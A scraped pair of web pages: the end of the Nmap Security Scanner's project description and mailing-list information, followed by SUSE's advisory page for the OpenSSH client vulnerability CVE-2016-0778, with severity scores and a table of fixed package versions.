administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.suse.com_8726fedb_20250126_125244.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2016-0778.html)
[English](https://www.suse.com/security/cve/CVE-2016-0778.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2016-0778.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2016-0778.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2016-0778.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2016-0778.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2016-0778.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2016-0778.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2016-0778

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2016-0777.html) [[Index]](index.html) [[Next]](CVE-2016-0779.html)

### Upstream information

[CVE-2016-0778 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0778)

#### Description

The (1) roaming\_read and (2) roaming\_write functions in roaming\_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2, when certain proxy and forward options are enabled, do not properly maintain connection file descriptors, which allows remote servers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact by requesting many forwardings.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [important](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 4.6 |
| Vector | AV:N/AC:H/Au:S/C:P/I:P/A:P |
| Access Vector | Network |
| Access Complexity | High |
| Authentication | Single |
| Confidentiality Impact | Partial |
| Integrity Impact | Partial |
| Availability Impact | Partial |

[CVSS v3 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 8.1 |
| Vector | CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Attack Vector | Network |
| Attack Complexity | High |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality Impact | High |
| Integrity Impact | High |
| Availability Impact | High |
| CVSSv3 Version | 3 |

#### Note from the SUSE Security Team

This issue affects only the openssh client in openssh 5.4 and later versions. Older openssh versions are not affected.SUSE Bugzilla entries: [961645](https://bugzilla.suse.com/show_bug.cgi?id=961645) [RESOLVED / FIXED], [996040](https://bugzilla.suse.com/show_bug.cgi?id=996040) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [SUSE-SU-2016:0117-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001802.html), published Thu Jan 14 12:11:30 MST 2016
* [SUSE-SU-2016:0118-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001803.html), published Thu Jan 14 12:12:08 MST 2016
* [SUSE-SU-2016:0119-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001804.html), published Thu Jan 14 12:12:45 MST 2016
* [SUSE-SU-2016:0120-1](https://lists.suse.com/pipermail/sle-security-updates/2016-January/001805.html), published Thu Jan 14 12:13:21 MST 2016
* [TID7017154](https://www.suse.com/support/kb/doc?id=7017154), published Fri Jan 15 01:09:20 CET 2016
* [TID7017155](https://www.suse.com/support/kb/doc?id=7017155), published Fri Jan 15 01:09:18 CET 2016
* [openSUSE-SU-2016:0127-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/#R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2), published Fri Dec 8 15:48:34 2023
* [openSUSE-SU-2016:0128-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/#KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q), published Fri Dec 8 15:48:34 2023
* [openSUSE-SU-2016:0144-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/SKEQIBI4FAQSK2KSGNHUDTP6IFNW72I3/#SKEQIBI4FAQSK2KSGNHUDTP6IFNW72I3), published Fri Dec 8 15:48:34 2023
* [openSUSE-SU-2016:0145-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/ZQX4IUCQNLQ6M7HK5P6KRSV2TQWA4FTF/#ZQX4IUCQNLQ6M7HK5P6KRSV2TQWA4FTF), published Fri Dec 8 15:48:34 2023

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| SUSE Enterprise Storage 6 SUSE Linux Enterprise High Performance Computing 15 SP1 SUSE Linux Enterprise Server 15 SP1 SUSE Linux Enterprise Server for SAP Applications 15 SP1 SUSE Manager Proxy 4.0 SUSE Manager Retail Branch Server 4.0 SUSE Manager Server 4.0 | * `openssh >= 7.9p1-4.7` * `openssh-fips >= 7.9p1-4.7` * `openssh-helpers >= 7.9p1-4.7` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP1 GA openssh-7.9p1-4.7SUSE Linux Enterprise Module for Server Applications 15 SP1 GA openssh-fips-7.9p1-4.7 |
| SUSE Enterprise Storage 7.1 SUSE Linux Enterprise High Performance Computing 15 SP3 SUSE Linux Enterprise Server 15 SP3 SUSE Linux Enterprise Server for SAP Applications 15 SP3 SUSE Manager Proxy 4.2 SUSE Manager Retail Branch Server 4.2 SUSE Manager Server 4.2 | * `openssh >= 8.4p1-1.30` * `openssh-clients >= 8.4p1-1.30` * `openssh-common >= 8.4p1-1.30` * `openssh-fips >= 8.4p1-1.30` * `openssh-helpers >= 8.4p1-1.30` * `openssh-server >= 8.4p1-1.30` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP3 GA openssh-8.4p1-1.30SUSE Linux Enterprise Module for Server Applications 15 SP3 GA openssh-fips-8.4p1-1.30 |
| SUSE Enterprise Storage 7 SUSE Linux Enterprise High Performance Computing 15 SP2 SUSE Linux Enterprise Server 15 SP2 SUSE Linux Enterprise Server for SAP Applications 15 SP2 SUSE Manager Proxy 4.1 SUSE Manager Retail Branch Server 4.1 SUSE Manager Server 4.1 | * `openssh >= 8.1p1-3.21` * `openssh-fips >= 8.1p1-3.21` * `openssh-helpers >= 8.1p1-3.21` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP2 GA openssh-8.1p1-3.21SUSE Linux Enterprise Module for Server Applications 15 SP2 GA openssh-fips-8.1p1-3.21 |
| SUSE Liberty Linux 7 | * `openssh >= 6.6.1p1-23.el7_2` * `openssh-askpass >= 6.6.1p1-23.el7_2` * `openssh-clients >= 6.6.1p1-23.el7_2` * `openssh-keycat >= 6.6.1p1-23.el7_2` * `openssh-ldap >= 6.6.1p1-23.el7_2` * `openssh-server >= 6.6.1p1-23.el7_2` * `openssh-server-sysvinit >= 6.6.1p1-23.el7_2` * `pam_ssh_agent_auth >= 0.9.3-9.23.el7_2` | Patchnames: RHSA-2016:0043 |
| SUSE Linux Enterprise Desktop 11 SP3 | * `openssh >= 6.2p2-0.24.1` * `openssh-askpass >= 6.2p2-0.24.1` * `openssh-askpass-gnome >= 6.2p2-0.24.3` | Patchnames: sledsp3-openssh-2016011301-12325 |
| SUSE Linux Enterprise Desktop 11 SP4 | * `openssh >= 6.6p1-16.1` * `openssh-askpass-gnome >= 6.6p1-16.4` * `openssh-helpers >= 6.6p1-16.1` | Patchnames: sledsp4-openssh-2016011302-12326 |
| SUSE Linux Enterprise Desktop 12 SP1 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-DESKTOP-12-SP1-2016-85 |
| SUSE Linux Enterprise Desktop 12 SP2 | * `openssh >= 7.2p2-55.1` * `openssh-helpers >= 7.2p2-55.1` | Patchnames: SUSE Linux Enterprise Desktop 12 SP2 GA openssh-7.2p2-55.1 |
| SUSE Linux Enterprise Desktop 12 SP3 | * `openssh >= 7.2p2-69.1` * `openssh-helpers >= 7.2p2-69.1` | Patchnames: SUSE Linux Enterprise Desktop 12 SP3 GA openssh-7.2p2-69.1 |
| SUSE Linux Enterprise Desktop 12 SP4 | * `openssh >= 7.2p2-74.25.1` * `openssh-helpers >= 7.2p2-74.25.1` | Patchnames: SUSE Linux Enterprise Desktop 12 SP4 GA openssh-7.2p2-74.25.1 |
| SUSE Linux Enterprise Desktop 12 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-DESKTOP-12-2016-85 |
| SUSE Linux Enterprise Desktop 15 SP1 SUSE Linux Enterprise Module for Basesystem 15 SP1 | * `openssh >= 7.9p1-4.7` * `openssh-helpers >= 7.9p1-4.7` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP1 GA openssh-7.9p1-4.7 |
| SUSE Linux Enterprise Desktop 15 SP2 SUSE Linux Enterprise Module for Basesystem 15 SP2 | * `openssh >= 8.1p1-3.21` * `openssh-helpers >= 8.1p1-3.21` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP2 GA openssh-8.1p1-3.21 |
| SUSE Linux Enterprise Desktop 15 SP3 SUSE Linux Enterprise Module for Basesystem 15 SP3 | * `openssh >= 8.4p1-1.30` * `openssh-clients >= 8.4p1-1.30` * `openssh-common >= 8.4p1-1.30` * `openssh-helpers >= 8.4p1-1.30` * `openssh-server >= 8.4p1-1.30` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP3 GA openssh-8.4p1-1.30 |
| SUSE Linux Enterprise Desktop 15 SP4 SUSE Linux Enterprise High Performance Computing 15 SP4 SUSE Linux Enterprise Module for Basesystem 15 SP4 SUSE Linux Enterprise Server 15 SP4 SUSE Linux Enterprise Server for SAP Applications 15 SP4 SUSE Manager Proxy 4.3 SUSE Manager Retail Branch Server 4.3 SUSE Manager Server 4.3 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-fips >= 8.4p1-3.9.1` * `openssh-helpers >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP4 GA openssh-8.4p1-3.9.1 |
| SUSE Linux Enterprise Desktop 15 SP5 SUSE Linux Enterprise High Performance Computing 15 SP5 SUSE Linux Enterprise Module for Basesystem 15 SP5 SUSE Linux Enterprise Server 15 SP5 SUSE Linux Enterprise Server for SAP Applications 15 SP5 | * `openssh >= 8.4p1-150300.3.18.2` * `openssh-clients >= 8.4p1-150300.3.18.2` * `openssh-common >= 8.4p1-150300.3.18.2` * `openssh-fips >= 8.4p1-150300.3.18.2` * `openssh-helpers >= 8.4p1-150300.3.18.2` * `openssh-server >= 8.4p1-150300.3.18.2` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP5 GA openssh-8.4p1-150300.3.18.2 |
| SUSE Linux Enterprise Desktop 15 SP6 SUSE Linux Enterprise High Performance Computing 15 SP6 SUSE Linux Enterprise Module for Basesystem 15 SP6 SUSE Linux Enterprise Server 15 SP6 SUSE Linux Enterprise Server for SAP Applications 15 SP6 | * `openssh >= 9.6p1-150600.4.2` * `openssh-clients >= 9.6p1-150600.4.2` * `openssh-common >= 9.6p1-150600.4.2` * `openssh-fips >= 9.6p1-150600.4.2` * `openssh-helpers >= 9.6p1-150600.4.2` * `openssh-server >= 9.6p1-150600.4.2` * `openssh-server-config-disallow-rootlogin >= 9.6p1-150600.4.2` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 SP6 GA openssh-9.6p1-150600.4.2 |
| SUSE Linux Enterprise Desktop 15 SUSE Linux Enterprise Module for Basesystem 15 | * `openssh >= 7.6p1-7.8` * `openssh-helpers >= 7.6p1-7.8` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 GA openssh-7.6p1-7.8 |
| SUSE Linux Enterprise High Performance Computing 12 SP5 | * `openssh >= 7.2p2-74.45.1` * `openssh-fips >= 7.2p2-74.45.1` * `openssh-helpers >= 7.2p2-74.45.1` | Patchnames: SUSE Linux Enterprise High Performance Computing 12 SP5 GA openssh-7.2p2-74.45.1 |
| SUSE Linux Enterprise High Performance Computing 15 SUSE Linux Enterprise Server 15 SUSE Linux Enterprise Server for SAP Applications 15 | * `openssh >= 7.6p1-7.8` * `openssh-fips >= 7.6p1-7.8` * `openssh-helpers >= 7.6p1-7.8` | Patchnames: SUSE Linux Enterprise Module for Basesystem 15 GA openssh-7.6p1-7.8SUSE Linux Enterprise Module for Server Applications 15 GA openssh-fips-7.6p1-7.8 |
| SUSE Linux Enterprise Micro 5.0 | * `openssh >= 8.1p1-5.12.3` | Patchnames: SUSE Linux Enterprise Micro 5.0 GA openssh-8.1p1-5.12.3 |
| SUSE Linux Enterprise Micro 5.1 | * `openssh >= 8.4p1-3.3.1` * `openssh-clients >= 8.4p1-3.3.1` * `openssh-common >= 8.4p1-3.3.1` * `openssh-fips >= 8.4p1-3.3.1` * `openssh-server >= 8.4p1-3.3.1` | Patchnames: SUSE Linux Enterprise Micro 5.1 GA openssh-8.4p1-3.3.1 |
| SUSE Linux Enterprise Micro 5.2 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-fips >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: SUSE Linux Enterprise Micro 5.2 GA openssh-8.4p1-3.9.1 |
| SUSE Linux Enterprise Micro 5.3 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-fips >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: SUSE Linux Enterprise Micro 5.3 GA openssh-8.4p1-3.9.1 |
| SUSE Linux Enterprise Micro 5.4 | * `openssh >= 8.4p1-150300.3.15.4` * `openssh-clients >= 8.4p1-150300.3.15.4` * `openssh-common >= 8.4p1-150300.3.15.4` * `openssh-fips >= 8.4p1-150300.3.15.4` * `openssh-server >= 8.4p1-150300.3.15.4` | Patchnames: SUSE Linux Enterprise Micro 5.4 GA openssh-8.4p1-150300.3.15.4 |
| SUSE Linux Enterprise Module for Server Applications 15 SP1 | * `openssh-fips >= 7.9p1-4.7` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 SP1 GA openssh-fips-7.9p1-4.7 |
| SUSE Linux Enterprise Module for Server Applications 15 SP2 | * `openssh-fips >= 8.1p1-3.21` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 SP2 GA openssh-fips-8.1p1-3.21 |
| SUSE Linux Enterprise Module for Server Applications 15 SP3 | * `openssh-fips >= 8.4p1-1.30` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 SP3 GA openssh-fips-8.4p1-1.30 |
| SUSE Linux Enterprise Module for Server Applications 15 | * `openssh-fips >= 7.6p1-7.8` | Patchnames: SUSE Linux Enterprise Module for Server Applications 15 GA openssh-fips-7.6p1-7.8 |
| SUSE Linux Enterprise Server 11 SP3 SUSE Linux Enterprise Server for SAP Applications 11 SP3 | * `openssh >= 6.2p2-0.24.1` * `openssh-askpass >= 6.2p2-0.24.1` * `openssh-askpass-gnome >= 6.2p2-0.24.3` | Patchnames: slessp3-openssh-2016011301-12325 |
| SUSE Linux Enterprise Server 11 SP4 SUSE Linux Enterprise Server for SAP Applications 11 SP4 | * `openssh >= 6.6p1-16.1` * `openssh-askpass-gnome >= 6.6p1-16.4` * `openssh-fips >= 6.6p1-16.1` * `openssh-helpers >= 6.6p1-16.1` | Patchnames: slessp4-openssh-2016011302-12326 |
| SUSE Linux Enterprise Server 11-SECURITY | * `openssh-openssl1 >= 6.6p1-10.1` * `openssh-openssl1-helpers >= 6.6p1-10.1` | Patchnames: SUSE Linux Enterprise Server 11-SECURITY GA openssh-openssl1-6.6p1-10.1secsp3-openssh-openssl1-12327 |
| SUSE Linux Enterprise Server 12 SP1 SUSE Linux Enterprise Server for SAP Applications 12 SP1 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-fips >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-SERVER-12-SP1-2016-85 |
| SUSE Linux Enterprise Server 12 SP2 | * `openssh >= 7.2p2-55.1` * `openssh-fips >= 7.2p2-55.1` * `openssh-helpers >= 7.2p2-55.1` | Patchnames: SUSE Linux Enterprise Server 12 SP2 GA openssh-7.2p2-55.1 |
| SUSE Linux Enterprise Server 12 SP3 | * `openssh >= 7.2p2-69.1` * `openssh-fips >= 7.2p2-69.1` * `openssh-helpers >= 7.2p2-69.1` | Patchnames: SUSE Linux Enterprise Server 12 SP3 GA openssh-7.2p2-69.1 |
| SUSE Linux Enterprise Server 12 SP4 | * `openssh >= 7.2p2-74.25.1` * `openssh-fips >= 7.2p2-74.25.1` * `openssh-helpers >= 7.2p2-74.25.1` | Patchnames: SUSE Linux Enterprise Server 12 SP4 GA openssh-7.2p2-74.25.1 |
| SUSE Linux Enterprise Server 12 SP5 | * `openssh >= 7.2p2-74.45.1` * `openssh-fips >= 7.2p2-74.45.1` * `openssh-helpers >= 7.2p2-74.45.1` | Patchnames: SUSE Linux Enterprise Server 12 SP5 GA openssh-7.2p2-74.45.1 |
